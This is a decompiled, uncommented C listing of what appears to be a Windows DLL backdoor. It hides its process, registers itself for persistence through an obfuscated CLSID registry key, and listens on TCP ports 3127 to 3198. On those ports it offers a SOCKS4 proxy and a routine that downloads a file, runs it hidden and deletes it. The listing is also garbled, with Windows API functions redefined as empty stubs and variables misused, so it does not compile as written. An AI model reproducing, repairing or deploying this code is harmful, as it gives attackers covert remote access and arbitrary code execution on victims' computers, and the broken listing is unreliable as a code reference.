extern char LibFileName[]; 
extern char aS[]; 
extern char PrefixString[]; 
extern char aAbcdefghijkl_0[27]; 
extern char aAbcdefghijklmn[27]; 
extern char aErtvfgrefreivp[23]; 
extern char aPyfvqR6so5r20Q[60]; 
extern int dword_7E1A1D70; 
extern int dword_7E1A1D74; 
extern int dword_7E1A1D78; 
int  sub_7E1A14D0(char * s); 
int  sub_7E1A195F(int a1, char a2);
char  sub_7E1A1981(char a1);
char  sub_7E1A19FC(int a1, char *a2);
void  sub_7E1A1A1F();
void  sub_7E1A1A73(void hKey, char * lpSubKey, char * lpValueName, char * lpData); 
unsigned int  sub_7E1A1ADA();
 int  sub_7E1A1B52(int hostshort, int a2); 
void  sub_7E1A1C44(void a1); 
void  main(void hinstDLL, void fdwReason, void lpReserved); 

void * sub_7E1A1CD0(void *a1, unsigned int a2, unsigned int a3);
void  sub_7E1A1D30(char); 

void accept(void,void,void); 

void accept(void a,void aa,void aaa) 
{
}
void AcceptEx(void,void,void,void,void,void,void,void); 
void AcceptEx(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa,void aaaaaaa,void aaaaaaaa) 
{
}
void bind(void,void,void); 
void bind(void a,void aa,void aaa) 
{
}
void ntohl(void); 
void ntohl(void a) 
{
}
void recv(void,void,void,void); 
void recv(void a,void aa,void aaa,void aaaa) 
{
}
void GetTempPathA(void,void); 
void GetTempPathA(void a,void aa) 
{
}
void GetTempFileNameA(void,void,void,void); 
void GetTempFileNameA(void a,void aa,void aaa,void aaaa) 
{
}
void CreateFileA(void,void,void,void,void,void,void); 
void CreateFileA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa,void aaaaaaa) 
{
}
void WriteFile(void,void,void,void,void); 
void WriteFile(void a,void aa,void aaa,void aaaa,void aaaaa) 
{
}
void CloseHandle(void); 
void CloseHandle(void a) 
{
}
void CreateProcessA(void,void,void,void,void,void,void,void,void,void); 
void CreateProcessA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa,void aaaaaaa,void aaaaaaaa,void aaaaaaaaa,void aaaaaaaaaa) 
{
}
void WaitForSingleObject(void,void); 
void WaitForSingleObject(void a,void aa) 
{
}
void CloseHandle(void); 
void CloseHandle(void a) 
{
}
void DeleteFileA(void); 
void DeleteFileA(void a) 
{
}
void closesocket(void); 
void closesocket(void a) 
{
}
void inet_addr(void); 
void inet_addr(void a) 
{
}
void gethostbyname(void); 
void gethostbyname(void a) 
{
}
void send(void,void,void,void); 
void send(void a,void aa,void aaa,void aaaa) 
{
}
void connect(void,void,void); 
void connect(void a,void aa,void aaa) 
{
}
void GetTickCount(void); 
void GetTickCount(void ) 
{
}
void memcpy(void,void,void); 
void memcpy(void a,void aa,void aaa) 
{
}
void GetModuleHandleA(void); 
void GetModuleHandleA(void a) 
{
}
void LoadLibraryA(void); 
void LoadLibraryA(void a) 
{
}
void GetProcAddress(void,void); 
void GetProcAddress(void a,void aa) 
{
}
void RegOpenKeyExA(void,void,void,void,void); 
void RegOpenKeyExA(void a,void aa,void aaa,void aaaa,void aaaaa) 
{
}
void RegCreateKeyExA(void,void,void,void,void,void,void,void,void); 
void RegCreateKeyExA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa,void aaaaaaa,void aaaaaaaa,void aaaaaaaaa) 
{
}
void RegSetValueExA(void,void,void,void,void,void); 
void RegSetValueExA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa) 
{
}
void RegCloseKey(void); 
void RegCloseKey(void a) 
{
}
void GetModuleFileNameA(void,void,void); 
void GetModuleFileNameA(void a,void aa,void aaa) 
{
}
void socket(void,void,void); 
void socket(void a,void aa,void aaa) 
{
}
void CreateThread(void,void,void,void,void,void); 
void CreateThread(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa) 
{
}
void memset(void,void,void); 
void memset(void a,void aa,void aaa) 
{
}


int  sub_7E1A14D0(char * s)
{
	void v1; 
	int v2; 
	int result; 
	int v4; 
	void hObject; 
	int netlong; 
	char PathName; 
	char FileName; 
	char Buffer; 
	struct _STARTUPINFOA StartupInfo; 
	struct _PROCESS_INFORMATION ProcessInformation; 

	hObject = 0;
	recv(s, (char *)&netlong, 1, 0);
	recv(s, (char *)&netlong, 4, 0);
	v4 = ntohl(netlong);
	netlong = v4;
	if ( v4 == 322739874 )
	{
		GetTempPathA(0x104u, &PathName);
		GetTempFileNameA(&PathName, "tmp", 0, &FileName);
		v1 = CreateFileA(&FileName, 0x40000000u, 1u, 0, 2u, 0x80u, 0);
		hObject = v1;
		if ( v1 && v1 != (void)-1 )
		{
			while ( 1 )
			{
				v2 = recv(s, &Buffer, 1024, 0);
				if ( v2 <= 0 )
					break;
				WriteFile(hObject, &Buffer, v2, &netlong, 0);
			}
			CloseHandle(hObject);
			sub_7E1A1CD0(&StartupInfo, 0, 0x44u);
			StartupInfo.cb = 68;
			StartupInfo.dwFlags = 135;
			StartupInfo.dwYSize = 1;
			StartupInfo.dwXSize = 1;
			StartupInfo.dwY = 0;
			StartupInfo.dwX = 0;
			StartupInfo.wShowWindow = 0;
			wsprintfA(&Buffer, "\"%s\"", &FileName);
			if ( CreateProcessA(0, &Buffer, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation) )
			{
				WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFFu);
				CloseHandle(ProcessInformation.hThread);
				CloseHandle(ProcessInformation.hProcess);
				DeleteFileA(&FileName);
				return closesocket(s);
			}
		}
		else
		{
			hObject = 0;
		}
	}
	result = closesocket(s);
	if ( hObject )
		result = DeleteFileA(&FileName);
	return result;
}


 int  sub_7E1A1664(int a1, char * s)
{
	unsigned int v2; 
	unsigned int v3; 
	struct hostent *v4; 
	char name[300]; 

	v2 = 0;
	do
	{
		if ( recv(s, &name[v2], 1, 0) <= 0 )
			return 1;
		if ( !name[v2] )
			break;
		++v2;
	}
	while ( v2 < 0xFF );
	v3 = inet_addr(name);
	if ( !v3 || v3 == -1 )
	{
		v4 = gethostbyname(name);
		if ( !v4 )
			return 1;
		v3 = **(void **)v4->h_addr_list;
	}
	*a1 = v3;
	return 0;
}


int  sub_7E1A16D3(char * a1, char * a2, char * s, char * fd)
{
	int ST10E4_4_0; 
	char * ST10E8_4_0; 
	int *ST10EC_4_0; 
	unsigned int ST10F0_4_0; 
	int ST10F4_4_0; 
	char ST1104_1_0; 
	 int v10; 
	int result; 
	char * v12; 
	int *v13; 
	int v14; 
	int v15; 
	int readfds; 
	char buf; 

	sub_7E1A1D30(ST1104_1_0);
	readfds.fd_array[62] = a2;
	readfds.fd_array[61] = a1;
	while ( 1 )
	{
		readfds.fd_array[0] = s;
		readfds.fd_count = 1;
		v10 = 0;
		do
		{
			if ( readfds.fd_array[v10] == fd )
				break;
			++v10;
		}
		while ( (unsigned int)v10 < 1 );
		if ( v10 == 1 )
		{
			readfds.fd_array[1] = fd;
			readfds.fd_count = 2;
		}
		readfds.fd_array[60] = 0;
		readfds.fd_array[59] = 0;
		readfds.fd_array[58] = 0;
		readfds.fd_array[57] = (char *)&readfds;
		readfds.fd_array[56] = 0;
		result = select(
				ST10E4_4_0,
				(int *)ST10E8_4_0,
				ST10EC_4_0,
				(int *)ST10F0_4_0,
				(const struct timeval *)ST10F4_4_0);
		if ( result <= 0 )
			break;
		readfds.fd_array[60] = (char *)&readfds;
		readfds.fd_array[59] = s;
		if ( _WSAFDIsSet(v12, v13) )
		{
			readfds.fd_array[60] = 0;
			readfds.fd_array[59] = 4096;
			readfds.fd_array[58] = (char *)&buf;
			readfds.fd_array[57] = s;
			result = recv(ST10E8_4_0, (char *)ST10EC_4_0, v14, v15);
			if ( result <= 0 )
				return result;
			readfds.fd_array[60] = 0;
			readfds.fd_array[59] = result;
			readfds.fd_array[58] = (char *)&buf;
			readfds.fd_array[57] = fd;
			send(ST10E8_4_0, (const char *)ST10EC_4_0, v14, v15);
		}
		readfds.fd_array[60] = (char *)&readfds;
		readfds.fd_array[59] = fd;
		if ( _WSAFDIsSet(ST10F0_4_0, (int *)ST10F4_4_0) )
		{
			readfds.fd_array[60] = 0;
			readfds.fd_array[59] = 4096;
			readfds.fd_array[58] = (char *)&buf;
			readfds.fd_array[57] = fd;
			result = recv(ST10E8_4_0, (char *)ST10EC_4_0, ST10F0_4_0, ST10F4_4_0);
			if ( result <= 0 )
				return result;
			readfds.fd_array[60] = 0;
			readfds.fd_array[59] = result;
			readfds.fd_array[58] = (char *)&buf;
			readfds.fd_array[57] = s;
			send(ST10E8_4_0, (const char *)ST10EC_4_0, ST10F0_4_0, ST10F4_4_0);
		}
	}
	return result;
}


int  sub_7E1A17BA(char * a1, char * s)
{
	 int v2; 
	int v3; 
	 int v5; 
	char * fd; 
	char buf; 
	char v8; 
	char v9; 
	char v10; 
	int hostlong; 
	int v12; 
	struct sockaddr name; 

	fd = -1;
	if ( recv(s, &buf, 1, 2) != 1 )
		return closesocket(s);
	if ( buf == -123 )
	{
		sub_7E1A14D0(s);
		return closesocket(s);
	}
	if ( buf != 4 )
		goto LABEL_23;
	v2 = 0;
	while ( 1 )
	{
		v3 = recv(s, &v8 + v2, 8 - v2, 0);
		if ( v3 < 0 )
			break;
		if ( v3 )
		{
			v2 += v3;
			if ( v2 < 8 )
				continue;
		}
		goto LABEL_11;
	}
	v2 = v3;
LABEL_11:
	if ( v2 == 8 )
	{
		while ( recv(s, &v9, 1, 0) == 1 )
		{
			if ( !v9 )
			{
				if ( v8 == 4 )
				{
					if ( v10 == 1 )
					{
						if ( !hostlong || htonl(hostlong) & 0xFFFFFF00 || !sub_7E1A1664((int)&hostlong, s) )
						{
							*(char *)&name.sa_data[0] = v12;
							name.sa_family = 2;
							*&name.sa_data[2] = hostlong;
							v5 = socket(2, 1, 6);
							fd = v5;
							if ( v5 != -1 )
							{
								if ( !connect(fd, &name, 16) )
								{
									v8 = 4;
									v10 = 90;
									send(s, &v8, 8, 0);
									sub_7E1A16D3(a1, (char *)recv, s, fd);
									goto LABEL_25;
								}
							}
						}
					}
				}
				break;
			}
		}
LABEL_23:
		v8 = 4;
		v10 = 91;
		send(s, &v8, 8, 0);
LABEL_25:
		if ( fd != -1 )
			closesocket(fd);
	}
	return closesocket(s);
}


void  StartAddress(void a1)
{
	void v1; 
	 int v2; 

	v1 = 0;
	while ( 1 )
	{
		do
			v2 = accept((char *)a1, 0, 0);
		while ( !v2 );
		if ( v2 != -1 )
		{
			++dword_7E1A1D70;
			sub_7E1A17BA(v1, v2);
			--dword_7E1A1D70;
			if ( GetTickCount() - v1 < 0x14 )
				Sleep(0x32u);
			v1 = GetTickCount();
		}
	}
}


int  sub_7E1A195F(int a1, char a2)
{
	int v2; 

	v2 = a1;
	while ( *v2 && *(char *)v2 != a2 )
		++v2;
	return -(*v2 == a2) & v2;
}


char  sub_7E1A1981(char a1)
{
	int v1; 
	char result; 
	int v3; 
	char v4; 
	int v5; 
	char v6; 
	char v7; 
	int v8; 
	char v9; 

	memcpy(&v4, "ABCDEFGHIJKLMNOPQRSTUVWXYZ", 0x18u);
	v5 = *(char *)&aAbcdefghijklmn[24];
	v6 = aAbcdefghijklmn[26];
	memcpy(&v7, "abcdefghijklmnopqrstuvwxyz", 0x18u);
	v8 = *(char *)&aAbcdefghijkl_0[24];
	v9 = aAbcdefghijkl_0[26];
	v1 = sub_7E1A195F((int)&v4, a1);
	if ( v1 )
	{
		result = *(&v4 + (v1 - (void)&v4 + 13) % 26);
	}
	else
	{
		v3 = sub_7E1A195F((int)&v7, a1);
		if ( v3 )
			result = *(&v7 + (v3 - (void)&v7 + 13) % 26);
		else
			result = a1;
	}
	return result;
}


char  sub_7E1A19FC(int a1, char *a2)
{
	int v2; 
	char *v3; 
	char result; 

	v3 = a2;
	v2 = a1;
	while ( 1 )
	{
		result = *v3;
		if ( !*v3 )
			break;
		*v2++ = sub_7E1A1981(result);
		++v3;
	}
	*v2 = 0;
	return result;
}


void  sub_7E1A1A1F()
{
	void result; 
	const char ProcName; 

	sub_7E1A19FC((int)&ProcName, "ErtvfgreFreivprCebprff");
	result = GetModuleHandleA("kernel32.dll");
	if ( !result || result == (void)-1 )
		result = LoadLibraryA("kernel32.dll");
	if ( result )
	{
		if ( result != (void)-1 )
		{
			result = GetProcAddress(result, &ProcName);
			if ( result )
				result = (void)((int ( *)(void, void))result)(0, 1);
		}
	}
	return result;
}


void  sub_7E1A1A73(void hKey, char * lpSubKey, char * lpValueName, char * lpData)
{
	void result; 
	int v5; 
	void phkResult; 

	if ( !RegOpenKeyExA(hKey, lpSubKey, 0, 0x20006u, &phkResult)
			|| (result = RegCreateKeyExA(hKey, lpSubKey, 0, 0, 0, 0x20006u, 0, &phkResult, 0), !result) )
	{
		v5 = lstrlenA(lpData);
		RegSetValueExA(phkResult, lpValueName, 0, 1u, (const char *)lpData, v5 + 1);
		result = RegCloseKey(phkResult);
	}
	return result;
}


unsigned int  sub_7E1A1ADA()
{
	unsigned int result; 
	struct _MEMORY_BASIC_INFORMATION Buffer; 
	char Data; 
	const char SubKey; 

	result = VirtualQuery(sub_7E1A1ADA, &Buffer, 0x1Cu);
	if ( result )
	{
		sub_7E1A1CD0(&Data, 0, 0x100u);
		GetModuleFileNameA(Buffer.AllocationBase, &Data, 0x100u);
		sub_7E1A19FC((int)&SubKey, "PYFVQ\\{R6SO5R20-QR35-11PS-9P87-00NN005127RQ}\\VacebpFreire32");
		result = sub_7E1A1A73(void_CLASSES_ROOT, &SubKey, 0, &Data);
	}
	return result;
}


 int  sub_7E1A1B52(int hostshort, int a2)
{
	 int v2; 
	char * v3; 
	 int result; 
	 int v5; 
	int v6; 
	struct sockaddr name; 
	void lpParameter; 
	int v10; 
	void ThreadId; 

	name.sa_family = 2;
	*&name.sa_data[2] = 0;
	*(char *)&name.sa_data[0] = htons(hostshort);
	v2 = socket(2, 1, 6);
	v3 = v2;
	lpParameter = (void)v2;
	if ( v2 == -1 )
	{
		result = 1;
	}
	else
	{
		if ( bind(v2, &name, 16) )
		{
			closesocket(v3);
			v5 = 2;
		}
		else
		{
			if ( !listen(v3, 2147483647) )
			{
				v6 = a2;
				if ( a2 > 0 )
				{
					v10 = a2;
					do
						CreateThread(0, 0, (void ( *)(void))StartAddress, lpParameter, 0, &ThreadId);
					while ( v10-- != 1 );
					v6 = a2;
				}
				dword_7E1A1D74 = v6;
				dword_7E1A1D70 = 0;
				while ( 1 )
				{
					Sleep(0x12Cu);
					if ( dword_7E1A1D70 >= dword_7E1A1D74 - 2 )
					{
						CreateThread(0, 0, (void ( *)(void))StartAddress, lpParameter, 0, &ThreadId);
						++dword_7E1A1D74;
					}
					if ( !(GetTickCount() % 0x1F4) )
						sub_7E1A1ADA();
				}
			}
			closesocket(v3);
			v5 = 3;
		}
		result = v5;
	}
	return result;
}


void  sub_7E1A1C44(void a1)
{
	 int v1; 
	struct WSAData WSAData; 

	sub_7E1A1A1F();
	WSAStartup(2u, &WSAData);
	sub_7E1A1ADA();
	v1 = 3127;
	while ( 1 )
	{
		sub_7E1A1B52(v1, 3);
		Sleep(0x400u);
		if ( v1 > 3198 )
		{
			Sleep(0x800u);
			v1 = 3127;
		}
		++v1;
	}
}


void  main(void hinstDLL, void fdwReason, void lpReserved)
{
	if ( fdwReason == 1 )
	{
		dword_7E1A1D78 = (int)hinstDLL;
		CreateThread(0, 0, (void ( *)(void))sub_7E1A1C44, 0, 0, &fdwReason);
	}
	return 1;
}


void * sub_7E1A1CD0(void *a1, unsigned int a2, unsigned int a3)
{
	int v3; 
	int v4; 
	void *v5; 
	int v6; 
	unsigned int v7; 
	void *result; 
	unsigned int v9; 

	v3 = a3;
	if ( a3 )
	{
		v4 = a2;
		v5 = a1;
		if ( a3 < 4 )
			goto LABEL_13;
		v6 = -( int)a1 & 3;
		if ( v6 )
		{
			v3 = a3 - v6;
			do
			{
				*v5 = v4;
				v5 = (char *)v5 + 1;
				--v6;
			}
			while ( v6 );
		}
		v4 *= 16843009;
		v9 = v3;
		v3 &= 3u;
		v7 = v9 >> 2;
		if ( !v7 || (memset(v5, v4, 4 * v7), v5 = (char *)v5 + 4 * v7, v3) )
		{
LABEL_13:
			do
			{
				*v5 = v4;
				v5 = (char *)v5 + 1;
				--v3;
			}
			while ( v3 );
		}
		result = a1;
	}
	else
	{
		result = a1;
	}
	return result;
}




